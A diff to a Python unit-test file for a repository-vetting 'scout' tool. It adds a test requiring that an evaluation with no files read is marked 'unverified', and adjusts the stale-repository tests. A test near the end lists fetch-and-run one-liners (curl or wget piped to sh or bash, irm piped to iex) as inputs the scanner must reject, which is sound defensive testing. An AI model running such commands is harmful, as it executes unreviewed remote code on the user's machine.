@@ -136,6 +136,11 @@ class ScoutTests(unittest.TestCase):
         r = scout.evaluate(self.REPO, ["# hello"], self.TODAY)
         self.assertEqual(r["verdict"], "ok")
 
+    def test_no_files_read_is_unverified(self):
+        result = scout.evaluate(self.REPO, [], self.TODAY)
+        self.assertEqual(result["verdict"], "unverified")
+        self.assertIsNone(result["checks"][-1]["ok"])
+
     def test_missing_and_unreachable(self):
         self.assertEqual(scout.evaluate(None)["verdict"], "missing")
         self.assertEqual(scout.evaluate({})["verdict"], "unverified")
@@ -147,8 +152,8 @@ class ScoutTests(unittest.TestCase):
 
     def test_stale_and_archived(self):
         old = dict(self.REPO, pushed_at="2025-01-01T00:00:00Z")
-        self.assertEqual(scout.evaluate(old, [], self.TODAY)["verdict"], "ok-but-stale")
-        self.assertEqual(scout.evaluate(dict(self.REPO, archived=True), [], self.TODAY)["verdict"], "ok-but-stale")
+        self.assertEqual(scout.evaluate(old, ["# reviewed"], self.TODAY)["verdict"], "ok-but-stale")
+        self.assertEqual(scout.evaluate(dict(self.REPO, archived=True), ["# reviewed"], self.TODAY)["verdict"], "ok-but-stale")
 
     def test_curl_pipe_sh_rejected(self):
         for txt in ("curl -fsSL https://x.sh | sh", "wget -qO- https://x | sudo bash", "irm https://x/i.ps1 | iex",
